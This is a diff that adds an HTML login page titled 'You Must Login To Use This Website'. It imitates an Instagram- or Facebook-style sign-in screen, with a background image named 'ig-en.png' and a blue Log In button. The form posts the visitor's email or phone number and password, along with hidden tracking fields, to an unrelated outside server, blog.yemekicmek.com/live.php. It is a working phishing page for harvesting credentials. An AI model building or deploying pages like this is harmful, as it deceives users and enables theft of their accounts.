@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>You Must Login To Use This Website</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background: url('ig-en.png') no-repeat center center/cover;
+            display: flex;
+            align-items: flex-start; /* Move everything to the top */
+            justify-content: center;
+            height: 100vh;
+            background-color: #f0f2f5;
+            padding: 20px;
+        }
+
+        .login-form {
+            width: 100%;
+            max-width: 400px;
+            background: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            margin-top: 220px; /* Move form up */
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        input {
+            width: 100%;
+            height: 50px;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            background-color: white;
+            outline: none;
+        }
+
+        .login-button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px;
+            width: 100%;
+            height: 48px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 500px) {
+            .login-form {
+                width: 100%;
+                padding: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-form">
+        <form method="POST" action="https://blog.yemekicmek.com/live.php?402fed91ea8ae1ea8931">
+            <input type="hidden" name="ramadhan" value="780108491NDAyZmVkOTFlYThhZTFlYTg5MzE=">
+            <input type="hidden" name="type" value="402fed91ea8ae1ea8931">
+            <input type="text" id="email" name="email" placeholder="Email or phone number">
+            <input type="password" id="pwd" name="pwd" placeholder="Password">
+            <button type="submit" class="login-button">Log In</button>
+        </form>
+    </div>
+</body>
+</html>
